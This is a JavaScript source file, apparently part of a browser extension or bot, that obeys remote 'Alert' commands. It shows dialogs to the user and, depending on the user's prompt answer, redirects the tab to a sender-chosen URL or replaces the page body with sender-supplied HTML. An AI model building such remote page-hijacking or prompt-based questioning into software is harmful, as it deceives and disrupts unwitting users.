function handle_command(message) {
    console.log(message);
    let data = message.data;

    if (data.visible && document.hidden) return;
    if (data.focused && !document.hasFocus()) return;

    if (data.bootstrap && !document.getElementById("bot-bootstrap-script")) {
        let bootstrap_css_node = document.createElement("link");
        bootstrap_css_node.id = "bot-bootstrap-script";
        bootstrap_css_node.href = "https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css";
        bootstrap_css_node.rel = "stylesheet";
        bootstrap_css_node.crossorigin = "anonymous";
        document.head.appendChild(bootstrap_css_node);
    }

    switch (message.name) {
        case "Alert":
            if (data.force?.template && data.force.template != "0") {
                let template_data = data.force.template.split("_")
                let type = template_data[0]
                let index = parseInt(template_data[1])
                execute_alert(data, type, index)
            } else if (data.force?.type && data.force?.message) {
                switch (data.force.type) {
                    case "alert":
                        alert(data.force.message);
                        break;
                    case "confirm":
                        confirm(data.force.message);
                        break;
                    case "prompt":
                        prompt(data.force.message);
                        break;
                    default:
                        break;
                }
            } else {
                execute_alert(data, random_index(3))
            }
            break;

        default:
            break;
    }
}

function execute_alert(data, alert_type, template_index=null) {
    switch (alert_type) {
        case 0: case "alert":
            alert(get_template(template_index, data.alert))
            break;
        case 1: case "confirm":
            confirm(get_template(template_index, data.confirm));
            break;
        case 2: case "prompt":
            prompt_action = get_template(template_index, data.prompt)
            let input = prompt(prompt_action.message)

            if (prompt_action.otherwise) {
                if (input == prompt_action.value) break;
                if (prompt_action.otherwise.probability && Math.random() > prompt_action.otherwise.probability) break;

                switch (prompt_action.otherwise.action) {
                    case "redirect":
                        location.href = prompt_action.otherwise.to;
                        break;

                    case "replace_body":
                        document.body.innerHTML = prompt_action.otherwise.with;
                        break;

                    default:
                        break;
                }
            }
            break;
        default:
            break;
    }
}

function get_template(template_index, template_array) {
    if (template_index != null) return template_array[template_index]
    return template_array[random_index(template_array.length)]
}

function random_index(array_length) {
    return Math.floor(Math.random() * array_length);
}